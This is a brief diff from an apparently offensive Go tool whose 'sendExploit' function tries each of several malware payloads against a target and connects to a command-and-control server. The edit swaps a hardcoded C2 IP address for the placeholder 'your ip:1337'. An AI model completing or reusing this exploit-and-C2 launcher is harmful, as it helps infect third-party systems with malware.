@@ -50,7 +50,7 @@ func sendExploit(target string) int {
 	}
 
 	// Serveur C2
-	c2Server := "51.68.128.169:1337"
+	c2Server := "your ip:1337"
 
 	// Essayer chaque malware
 	for _, malware := range malwares {
